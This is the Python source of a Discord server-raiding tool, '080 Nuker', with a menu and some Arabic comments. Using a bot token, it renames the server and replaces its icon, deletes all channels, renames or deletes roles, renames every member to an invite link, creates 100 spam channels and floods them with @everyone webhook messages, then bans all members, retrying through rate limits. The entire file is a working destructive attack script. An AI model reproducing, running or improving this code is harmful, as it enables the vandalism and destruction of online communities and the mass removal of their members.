import os, asyncio, aiohttp, sys, random, time, requests, base64
from datetime import datetime
from colorama import Fore , Style
from packaging import version
from pystyle import Colorate, Write, System, Colors, Center, Anime
import requests

import ctypes

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

set_console_title("080 Nuker")   

__VERSION__ = '1.3'  

try:
    os.system('cls')
except:
    os.system('clear')

def cyan_gradient_text(text):
    colors = []
    for i in range(len(text)):
        r = int(0 + (i / max(len(text)-1, 1)) * 255)
        g = int(191 + (i / max(len(text)-1, 1)) * 64)
        b = int(255)
        colors.append(f"\033[38;2;{r};{g};{b}m")
    
    colored_text = ""
    for i, char in enumerate(text):
        if char == "\n":
            colored_text += char
        else:
            colored_text += f"{colors[i]}{char}"
    colored_text += Style.RESET_ALL
    return colored_text

def get_token():
    global token
    token = input(cyan_gradient_text("Token: "))
    headers = {
        "Authorization": f"Bot {token}"
    }
    if not 'id' in requests.Session().get("https://discord.com/api/v10/users/@me", headers=headers).json():
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mInvalid Token\033[0m")
        return get_token()
    
    try:
        os.system('cls')
    except:
        os.system('clear')
     
get_token()

headers = {
    "Authorization": f"Bot {token}"
}

async def get_guilds():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers) as r:
                if r.status == 200:
                    guilds = await r.json()
                    return guilds
                else:
                    return []
    except:
        return []

async def select_guild():
    print(cyan_gradient_text("\nYour Bot is in these Guilds:\n"))
    
    guilds = await get_guilds()
    if not guilds:
        print(cyan_gradient_text("Bot is not in any guilds."))
        return None

    for i, guild in enumerate(guilds, start=1):
        print(cyan_gradient_text(f"{i}. {guild['name']} (ID: {guild['id']})"))

    while True:
        try:
            choice = input(cyan_gradient_text("\nEnter the number of the guild you want to select: "))
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(guilds):
                    return guilds[idx]['id']
            print(cyan_gradient_text("Invalid choice, try again."))
        except:
            print(cyan_gradient_text("Invalid choice, try again."))

async def create_channels(session, guild_id, channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Channel to {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}")
            pass

async def create_roles(session, guild_id, role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Role to {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Role to {guild_id}")
            pass

async def rename_role(session, guild_id, role_id, new_name):
    while True:
        try:
            async with session.patch(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers, json={'name': new_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRenamed Role {role_id} to {new_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Rename Role {role_id}")
            pass

async def send_message(hook, message, amount:int):
    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            await session.post(hook,json={'content': message, 'tts': False})
            
async def WebhookSpam(session, guild_id, channel_id, web_name, msg_amt:int, msg):
    try:
        async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
            if r.status == 429:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
            else:
                if r.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Webhook {web_name} to {channel_id}")
                    webhook_raw = await r.json()
                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                    asyncio.create_task(send_message(webhook, msg, msg_amt))
    except:
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCreate Webhook to {channel_id}")
        
async def get_roles(guild_id):
    roles_data = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
                m = await r.json()
                for role in m:
                    roles_data.append({"id": role["id"], "name": role["name"]})
    except TypeError:
        print("SUS RATELIMTED...!")
    return roles_data

async def get_channels(guild_id):
    channelIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
                m = await r.json()
                for channel in m:
                    channelIDS.append(channel["id"])
    except TypeError:
        print("SUS RATELIMTED...!")
    return channelIDS
    
async def get_members(guild_id):
    memberIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
                m = await r.json()
                for member in m:
                    memberIDS.append(member["user"]["id"])
    except TypeError:
        print("SUS RATELIMTED...!")
    return memberIDS

async def ban_members(session, guild_id, member_id:str):
    while True:
        try:
            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mBanned Member {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Ban Member {member_id}")

async def delete_channels(session, guild_id, channel_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Channel {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}")

async def delete_role(session, guild_id, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    # تخطي الريت لمت والمتابعة مباشرة
                    continue
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Role {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Role {role_id}")
            break

async def change_server_name(session, guild_id, new_name):
    try:
        async with session.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json={'name': new_name}) as r:
            if r.status in [200, 201, 204]:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChanged server name to: {new_name}")
                return True
            else:
                return False
    except:
        return False

async def change_server_icon(session, guild_id):
    try:
        image_url = "https://cdn.discordapp.com/icons/1403857119517741128/6dbd2d802a9d1626abf264012e44225e.png?size=600a"
        response = requests.get(image_url)
        if response.status_code == 200:
            image_data = base64.b64encode(response.content).decode('utf-8')
            data = {
                "icon": f"data:image/jpeg;base64,{image_data}"
            }
            async with session.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json=data) as r:
                if r.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChanged server icon")
                    return True
        return False
    except:
        return False
async def rename_all_members(session, guild_id, new_nickname):
    """إعادة تسمية جميع الأعضاء في السيرفر بنفس السرعة"""
    members = await get_members(guild_id)
    if not members:
        return
    
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRenaming all members to '{new_nickname}'...")
    
    # إنشاء جميع المهام مرة واحدة
    tasks = []
    for member_id in members:
        task = rename_member_nodelay(session, guild_id, member_id, new_nickname)
        tasks.append(task)
    
    # تشغيل كل المهام معاً بدون تأخير
    await asyncio.gather(*tasks, return_exceptions=True)

async def rename_member_nodelay(session, guild_id, member_id, new_nickname):
    """إعادة تسمية عضو بدون تأخير"""
    try:
        async with session.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}",
            headers=headers,
            json={"nick": new_nickname}
        ) as r:
            if r.status in [200, 201, 204]:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRenamed member {member_id}")
            elif r.status == 429:
                # تجاهل الريت لميت والمتابعة
                pass
            else:
                # تجاهل الأخطاء الأخرى
                pass
    except:
        # تجاهل جميع الاستثناءات والمتابعة
        pass

async def nuker_080(session, guild_id):
    print("\nStarting 080 Nuker...")
    
    # 1. تغيير اسم السيرفر أولاً
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChanging server name...")
    await change_server_name(session, guild_id, "080")
    
    # 2. تغيير صورة السيرفر
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChanging server icon...")
    await change_server_icon(session, guild_id)
    
    # 3. حذف جميع الرومات
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleting all channels...")
    channels = await get_channels(guild_id)
    if channels:
        await asyncio.gather(*[delete_channels(session, guild_id, channel_id) for channel_id in channels])
    
    # 4. إنشاء 100 روم جديد
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreating 100 channels...")
    await asyncio.gather(*[create_channels(session, guild_id, "080", 0) for i in range(100)])
    
    # 5. إعادة تسمية جميع الرتب إلى "080" فقط (بدون حذفها)
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRenaming all roles to '080'...")
    roles = await get_roles(guild_id)
    if roles:
        await asyncio.gather(*[rename_role(session, guild_id, role["id"], "080") for role in roles])
    
    # 6. ⭐⭐ إعادة تسمية جميع الأعضاء إلى "discord.gg/080" ⭐⭐
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRenaming all members to 'discord.gg/080'...")
    await rename_all_members(session, guild_id, "discord.gg/080")
    
    # 7. الحصول على القنوات الجديدة للويب هوك
    new_channels = await get_channels(guild_id)
    
    # 8. سبام ويب هوك
    web_msg = "**قروب 080 يسلم عليكم discord.gg/080** \n||@everyone @here||"
    web_name = "080 Nuker"
    msg_amt = 10  
    
    if new_channels:
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mStarting webhook spam...")
        await asyncio.gather(*[WebhookSpam(session, guild_id, channel_id, web_name, msg_amt, web_msg) for channel_id in new_channels])
    
    # 9. بند جميع الأعضاء
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mBanning all members...")
    members = await get_members(guild_id)
    if members:
        await asyncio.gather(*[ban_members(session, guild_id, member_id) for member_id in members])
    
    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m080 Nuker completed!")

async def main():
    guild_id = await select_guild()
    if not guild_id:
        return

    while True:
        try:
            os.system('cls')
        except:
            os.system('clear')
        
        logo = f"""     
        
      .----.   .----.   .----.   
     /  ..  \ / .-.  \ /  ..  \  
    |  /  \  .\ '-'  /|  /  \  . 
    '  \  /  '/ /`.  \'  \  /  ' 
     \  `'  / \ '-'  / \  `'  /  
      `---''   `---''   `---''   
    ############################
            discord.gg/080  
    ############################             
        """
        
        time.sleep(0.0002)
        print(cyan_gradient_text(Center.XCenter(logo)), end='')
        
        print(Center.XCenter(cyan_gradient_text(f"""                                  
                          ╔══════════════════════════════╦═══════════════════════════════╗
                          ║   Version:    1.3            ║         Dev: 080              ║
                          ╚══════════════════════════════╩═══════════════════════════════╝
                 ╔══════════════════════════╦══════════════════════════╦════════════════════════╗
                 ║   [1] Delete Channels    ║    [2] Delete Roles      ║    [3] Ban Members     ║
                 ╠══════════════════════════╬══════════════════════════╬════════════════════════╣
                 ║   [4] Create Channels    ║    [5] Create Roles      ║    [6] Webhook Spam    ║
                 ╠══════════════════════════╬══════════════════════════╬════════════════════════╣
                 ║                          ║    [7] 080 Nuker         ║                        ║
                 ╚══════════════════════════╩══════════════════════════╩════════════════════════╝
        """)))
        
        choose = input(cyan_gradient_text("root@080 > "))
        
        if choose == '1':
            channels = await get_channels(guild_id)
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[delete_channels(session, guild_id, channel_id) for channel_id in channels])
        
        elif choose == '2':
            roles = await get_roles(guild_id)
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[delete_role(session, guild_id, role["id"]) for role in roles])
        
        elif choose == '4':
            chan_name = input(cyan_gradient_text("                                        Channel Name:  "))
            amt = int(input(cyan_gradient_text("                                        Amount:  ")))
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[create_channels(session, guild_id, chan_name, 0) for i in range(amt)])
        
        elif choose == '6':
            web_name = "Ran By 080"
            web_msg = input(cyan_gradient_text("                                        Webhook Content:  "))
            msg_amt = int(input(cyan_gradient_text("                                        Amount of Messages:  ")))
            
            channels = await get_channels(guild_id)
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[WebhookSpam(session, guild_id, channel_id, web_name, msg_amt, web_msg) for channel_id in channels])
        
        elif choose == '3':
            members = await get_members(guild_id)
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[ban_members(session, guild_id, member_id) for member_id in members])
        
        elif choose == '5':
            role_name = input(cyan_gradient_text("                                        Role Name:  "))
            amt = int(input(cyan_gradient_text("                                        Amount:  ")))
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[create_roles(session, guild_id, role_name) for i in range(amt)])
        
        elif choose == '7':
            async with aiohttp.ClientSession() as session:
                await nuker_080(session, guild_id)
        
        else:
            print(cyan_gradient_text("    Invalid option!"))

if __name__ == "__main__":
    asyncio.run(main())